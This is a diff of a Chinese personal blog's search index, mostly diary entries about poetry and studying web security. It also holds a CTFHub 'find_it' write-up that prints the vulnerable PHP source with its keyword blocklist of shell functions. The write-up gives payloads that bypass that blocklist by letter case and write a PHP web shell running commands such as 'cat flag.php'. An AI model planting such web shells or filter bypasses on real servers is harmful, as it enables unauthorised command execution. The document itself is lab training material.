@@ -1,141 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTFHUB-find_it</title>
-    <url>/2022/12/15/CTFHUB-find_it/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>扫描<br>首先拿DirBuster扫描工具扫一下，发现robots.txt<br>访问robots.txt文件，发现了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want: 1ndexx.php</span><br></pre></td></tr></table></figure>
-<p>但是当我们访问时却失败，于是用工具扫一下缓存<br>得到:1ndexx.php.swp访问成功</p>
-</li>
-<li><p>分析尝试<br>进入后呈现了一堆代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我们看到里面有get型传参code，并且设置了严格的过滤，以及字符长度小于34。<br>传参的code可以写入hack文件。而且flag就在hack文件中<br>当我们直接尝试访问时却无法访问hack.php，这是文件被隐藏了。<br>因为可以写入33个字符的代码，于是我们可以思考写入一段显示hack文件源码的代码。</p>
-</li>
-<li><p>破解<br>以下有三种方法：</p>
-</li>
-</ol>
-<ul>
-<li><p><strong>直接写入 phpinfo()</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-</li>
-<li><p><strong>show_source()</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure>
-<p>之后便可直接访问hack.php<br>得到flag</p>
-</li>
-<li><p><strong>System()</strong><br>代码中preg_match并没有忽略大小写，而php函数是可以忽略大小写的，所以可以使用System()来绕过正则检查</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php System($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>之后直接执行命令即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hack.php?1=ls -alh &amp;&amp; cat flag.php</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学会分析源码，才知道应该做什么。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.wolai.com/ctfhub/oKTHZCKnTRgZzifYg5twqZ">代码中preg</a><br><a href="https://blog.csdn.net/qq_46266956/article/details/124377403">CTFHUB find_it</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>锦瑟</title>
-    <url>/2022/11/05/Diary_1105/</url>
-    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
-<span id="more"></span>
-
-<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
-<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
-<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
-<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
-</li>
-<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
-</li>
-<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
-</li>
-<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
-</li>
-<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
-</li>
-</ol>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>惜</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>也无风雨也无晴</title>
-    <url>/2022/11/07/Diary_1107/</url>
-    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
-<span id="more"></span>
-
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
-<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
-<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
-<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>夫天地者，万物之逆旅也</title>
-    <url>/2022/11/08/Diary_1108/</url>
-    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
-<span id="more"></span>
-
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
-<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSRF跨站请求伪造</title>
     <url>/2022/12/06/CSRF/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
@@ -184,6 +49,141 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFHUB-find_it</title>
+    <url>/2022/12/15/CTFHUB-find_it/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>扫描<br>首先拿DirBuster扫描工具扫一下，发现robots.txt<br>访问robots.txt文件，发现了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want: 1ndexx.php</span><br></pre></td></tr></table></figure>
+<p>但是当我们访问时却失败，于是用工具扫一下缓存<br>得到:1ndexx.php.swp访问成功</p>
+</li>
+<li><p>分析尝试<br>进入后呈现了一堆代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们看到里面有get型传参code，并且设置了严格的过滤，以及字符长度小于34。<br>传参的code可以写入hack文件。而且flag就在hack文件中<br>当我们直接尝试访问时却无法访问hack.php，这是文件被隐藏了。<br>因为可以写入33个字符的代码，于是我们可以思考写入一段显示hack文件源码的代码。</p>
+</li>
+<li><p>破解<br>以下有三种方法：</p>
+</li>
+</ol>
+<ul>
+<li><p><strong>直接写入 phpinfo()</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+</li>
+<li><p><strong>show_source()</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure>
+<p>之后便可直接访问hack.php<br>得到flag</p>
+</li>
+<li><p><strong>System()</strong><br>代码中preg_match并没有忽略大小写，而php函数是可以忽略大小写的，所以可以使用System()来绕过正则检查</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php System($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>之后直接执行命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hack.php?1=ls -alh &amp;&amp; cat flag.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学会分析源码，才知道应该做什么。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.wolai.com/ctfhub/oKTHZCKnTRgZzifYg5twqZ">代码中preg</a><br><a href="https://blog.csdn.net/qq_46266956/article/details/124377403">CTFHUB find_it</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>惜</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>也无风雨也无晴</title>
+    <url>/2022/11/07/Diary_1107/</url>
+    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
+<span id="more"></span>
+
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
+<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
+<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
+<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>锦瑟</title>
+    <url>/2022/11/05/Diary_1105/</url>
+    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
+<span id="more"></span>
+
+<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
+<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
+<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
+<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
+</li>
+<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
+</li>
+<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
+</li>
+<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
+</li>
+<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
+</li>
+</ol>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>夫天地者，万物之逆旅也</title>
+    <url>/2022/11/08/Diary_1108/</url>
+    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
+<span id="more"></span>
+
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
+<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -265,14 +265,15 @@
       </tags>
   </entry>
   <entry>
-    <title>平水远矣</title>
-    <url>/2022/11/19/Diary_1119/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
+    <title>普通且自信</title>
+    <url>/2022/11/18/Diary_1118/</url>
+    <content><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p>
-<h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p>
-<h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p>
